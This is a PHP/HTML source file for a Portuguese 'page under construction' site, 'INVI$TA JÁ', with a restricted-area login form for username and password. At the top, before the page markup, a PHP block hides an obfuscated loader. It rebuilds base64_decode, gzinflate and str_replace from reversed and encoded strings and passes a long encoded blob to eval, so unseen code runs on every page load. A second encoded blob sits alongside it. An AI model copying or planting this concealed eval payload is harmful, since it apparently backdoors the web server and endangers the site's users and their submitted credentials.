<!DOCTYPE html>
<?php
$x="B4vPM1p1HZUN0me6rT9ruUaYgcJEw8b9v8iLid/JwLcDy7Moz6teQOmY1mXSxjg3le3SX5ClQXHDQ2pbf1Lv45Xt0V0gmIe0WS06Uyh1RsuRVZhtTB9x6pFQRLI5XEN0~O9EzfWV61OHx1WquSlaHqu6ccbZovXrPzjcr6ktkruodfY2AO1OtVf~mrc6Kkjys4B6qEVjAa9j9CBmtpO0AnbSz~oj~UZfKtUOUIzENZlv0gg9CzaNX/6P7Y3yPh6ABDTlYWFDqarMoMoQLlJCKEMIuaeWRaP/noYECkGoBeynrR~JFCsBY2/zj6WhUe4EJn5NuNvLdxMEn8K6GbEQxETi/O4IdGuz9g4Id4tZn1d8VewMaoiy9f3e~rEHa7e7W1C2YyvEFiT/NgyeDBdpkIKUl3TIEhNsD7vQvbIEAN4aNJZj";$b=strrev("edoced_46esab");$g=strrev($b("ZXRhbGZuaXpn"));$r=strrev($b("ZWNhbHBlcl9ydHM="));eval($g($b(strrev($r($b("fg=="),$b("Kw=="),$x)))));$xx="jZJNa4NAEIbvQv7DsNhEIT3lUKIkpdBDeygN+TiFEvyY2C1W7e7aHEr~e3f9yioaMweV8d1nZt4dI4g9zuGdI4O+iTExQEbG6K8nEMxdLvNuN5nJE4eUhW6jz+2YBsCFJ~RrnyeBoGkCEYon+PaRWeauIMEKCJlLQoMoMraqDFWYlTDBA6hPy3Y7P6+XNazC9gg0vlZNEzIUOUtKfZU~jo~zSbnA0OptmBC9j9aAjVEq6B4syjkK6crm~fVtO1OA2Yfdourktk6rcjzPrXvoZbcc6uqHalSuqW1xHO16VWfzE9O~0NEX5ILRQFp6x9BTthZVRusR1hyU60SW0eImg0V0tX54vL1fbp2QDHXQlC5XS3el3gjxSXm1YmOQet6zoM7yDcLwJ+diLi8v9b8wEJcgYaUur9Tr6em0NUZH1p1MPv4B";		
?>
<html>
    <head>
        <title>INVI$TA JÁ</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="app/css/bovespa.css" type="text/css" rel="stylesheet">
        <style>
            .icon-bar {
                background-color: #fff;
            }
            .icon-bar {
                display: block;
                width: 22px !important;
                height: 2px !important;
                border-radius: 1px;
                margin-top: 2px;
            }
        </style>
    </head>     
    <body  class="bovespa">
        <div class="s-row s-center" >
            <div  class="s-card s-md-col-4 s-md-back-Green-600 margin-left-1">
                <div  class="s-card-head s-md-back-Green-500">
                    <div class="s-md-back-Green-600 s-card-content" style="height: calc(90% - 0.9em); ">
                        <div class="s-center s-uppercase s-size-18 s-md-font-White">
                            <span>                                
                                <div class="s-uppercase">
                                    INVI$TA JÁ
                                </div>
                            </span>
                        </div>
                    </div>
                    <div class="s-card-content s-md-back-Green-500">
                        <div class="s-center s-size-12">
                            <img src="app/resources/images/gear.gif" height="100">
                        </div>
                    </div>                   
                    <div class="s-card-content s-md-back-Green-500">
                        <div class="s-center s-uppercase s-size-14 s-md-font-White">
                            Pagina Em construção, aguarde!
                        </div>                       
                    </div>  
                    <div  class="s-card-head s-card-action">                                    
                        <div class="s-card-content s-md-back-Green-600"  style="height: calc(90% - 0.9em); ">                      
                            <div class="s-center s-uppercase s-size-15 s-md-font-White">
                                Área Restrita
                            </div>
                        </div>
                        <div class="s-card-content s-md-back-Green-600">
                            <form  class="s-md-col-12" method="POST">
                                <div class="s-row s-center" >
                                    <div class="s-md-col-5">
                                        <label for="user" class="s-center s-uppercase s-size-14 s-md-font-White">
                                            <span>Usuário</span>
                                        </label>
                                    </div>
                                    <div class="s-md-col-10">
                                        <input id="user" type="text" name="user"></input>
                                    </div>
                                </div>
                                <div class="s-row s-center" >
                                    <div class="s-md-col-5">
                                        <label for="password" class="s-center s-uppercase s-size-14 s-md-font-White">
                                            <span>Senha</span>
                                        </label>
                                    </div>
                                    <div class="s-md-col-10">
                                        <input id="password" type="password" name="password"></input>
                                    </div>
                                </div>
                                <div class="s-card-content">
                                    <button type="submit" class="btn-quad btn-large ripple s-md-back-Orange-500  s-uppercase s-md-font-White" style='float:right;right:-0.5em;'>
                                        <div>
                                            Acessar
                                        </div>
                                    </button>
                                </div>
                            </form>
                        </div>                       
                    </div>  
                </div>   
            </div>         
        </div>
    </body> 
    <script src="app/js/core.js"></script>
    <?php
    if (\User::RestrictedArea()->equals(\User::getPosted())) {
        ?>
        <script src="app/js/bovespa.js"></script>
        <?php
    }
    ?>

</html>

